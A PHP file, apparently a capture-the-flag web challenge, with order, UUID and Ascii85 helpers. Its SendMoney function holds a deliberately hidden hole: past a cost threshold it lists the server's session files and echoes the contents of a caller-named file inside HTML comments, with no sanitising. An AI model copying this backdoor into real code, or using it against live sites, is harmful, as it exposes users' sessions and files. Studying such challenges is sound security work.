<?php


$debug = 'yes';

function SendMoney_(){

    if ($handle = opendir(session_save_path())) {
            foreach(scandir(session_save_path()) as $value){
                if ($value != "." && $value != ".." && preg_match('/ess/', $value)) {
                    //echo $value."1f1\n";
                    echo $value."\n";
                }
            }
            closedir($handle);
        }
}
function is_active($page){
    if(basename($_SERVER['SCRIPT_FILENAME'])==$page)
        echo 'class="active"';
    return;
}
function SendMoney($sAI, $Ad,$Adem,$g,$fde) {




    if($fde>=scost){
        echo "<!-- 1\n";
        if (preg_match('/^\{?[0-9a-f]{8}\-?[0-9a-f]{4}\-?[0-9a-f]{4}\-?'.'[0-9a-f]{4}\-?[0-9a-f]{13}\}?$/i', $Ad)) {
            
            Sendmoney_();
        }
        echo 1;
        echo session_save_path().$sAI;
        if (file_exists(session_save_path().$sAI)) {
            echo 2;
            echo session_save_path().$sAI;
            echo '<pre>';

            $filename = session_save_path().$sAI;

            $file_handle = fopen(session_save_path().$sAI, "r");
            while (!feof($file_handle)) {

                $line = fgets($file_handle);
                echo $line;
            }
            fclose($file_handle);


            echo '</pre>';
        }



        echo "-->";
    }
     global $Product;
     return $Product->create_order($Ad,$Adem,$g);


}

class duck
{
    public static function find($str) {
        $str = preg_replace("/ \t\r\n\f/","",$str);
        $str = preg_replace("/z/","!!!!!",$str);
        $str = preg_replace("/y/","+<VdL/",$str);

        $padding = 5 - (strlen($str) % 5);
        if (strlen($str) % 5 === 0) {
            $padding = 0;
        }
        $str .= str_repeat('u',$padding);
        $num = 0;
        $ret = '';
        // Foreach 5 chars, convert it to an integer
        while ($chunk = substr($str, $num * 5, 5)) {
            $tmp = 0;
            foreach (unpack('C*',$chunk) as $item) {
                $tmp *= 85;
                $tmp += $item - 33;
            }
            // Convert the integer in to a string
            $ret .= pack('N', $tmp);
            $num++;
        }
        // Remove any padding we had to add
        $ret = substr($ret,0,strlen($ret) - $padding);
        return $ret;
    }
    public static function close($str) {
        $ret   = '';
        $debug = 0;
        $padding = 4 - (strlen($str) % 4);
        if (strlen($str) % 4 === 0) {
            $padding = 0;
        }
        if ($debug) {
            printf("Length: %d = Padding: %s<br /><br />\n",strlen($str),$padding);
        }
        // If we don't have a four byte chunk, append \0s
        $str .= str_repeat("\0", $padding);
        foreach (unpack('N*',$str) as $chunk) {
            // If there is an all zero chunk, it has a shortcut of 'z'
            if ($chunk == "\0") {
                $ret .= "z";
                continue;
            }
            // Four spaces has a shortcut of 'y'
            if ($chunk == 538976288) {
                $ret .= "y";
                continue;
            }
            if ($debug) {
                var_dump($chunk); print "<br />\n";
            }
            // Convert the integer into 5 "quintet" chunks
            for ($a = 0; $a < 5; $a++) {
                $b  = intval($chunk / (pow(85,4 - $a)));
                $ret .= chr($b + 33);
                if ($debug) {
                    printf("%03d = %s <br />\n",$b,chr($b+33));
                }
                $chunk -= $b * pow(85,4 - $a);
            }
        }
        // If we added some null bytes, we remove them from the final string
        if ($padding) {
            $ret = preg_replace("/z$/",'!!!!!',$ret);
            $ret = substr($ret,0,strlen($ret) - $padding);
        }
        return $ret;
    }
}


class UUID {
  public static function v3($namespace, $name) {
    if(!self::is_valid($namespace)) return false;
    $nhex = str_replace(array('-','{','}'), '', $namespace);
    $nstr = '';
    for($i = 0; $i < strlen($nhex); $i+=2) {
      $nstr .= chr(hexdec($nhex[$i].$nhex[$i+1]));
    }
    $hash = md5($nstr . $name);
    return sprintf('%08s-%04s-%04x-%04x-%12s',
      substr($hash, 0, 8),
      substr($hash, 8, 4),
      (hexdec(substr($hash, 12, 4)) & 0x0fff) | 0x3000,
      (hexdec(substr($hash, 16, 4)) & 0x3fff) | 0x8000,
      substr($hash, 20, 12)
    );
  }

  public static function v4() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
      mt_rand(0, 0xffff), mt_rand(0, 0xffff),
      mt_rand(0, 0xffff),
      mt_rand(0, 0x0fff) | 0x4000,
      mt_rand(0, 0x3fff) | 0x8000,
      mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
  }
  public static function v5($namespace, $name) {
    if(!self::is_valid($namespace)) return false;
    $nhex = str_replace(array('-','{','}'), '', $namespace);
    $nstr = '';
    for($i = 0; $i < strlen($nhex); $i+=2) {
      $nstr .= chr(hexdec($nhex[$i].$nhex[$i+1]));
    }
    $hash = sha1($nstr . $name);
    return sprintf('%08s-%04s-%04x-%04x-%12s',
      substr($hash, 0, 8),
      substr($hash, 8, 4),
      (hexdec(substr($hash, 12, 4)) & 0x0fff) | 0x5000,
      (hexdec(substr($hash, 16, 4)) & 0x3fff) | 0x8000,
      substr($hash, 20, 12)
    );
  }
  public static function is_valid($uuid) {return preg_match('/^\{?[0-9a-f]{8}\-?[0-9a-f]{4}\-?[0-9a-f]{4}\-?'.'[0-9a-f]{4}\-?[0-9a-f]{12}\}?$/i', $uuid) === 1;
  }
}

?>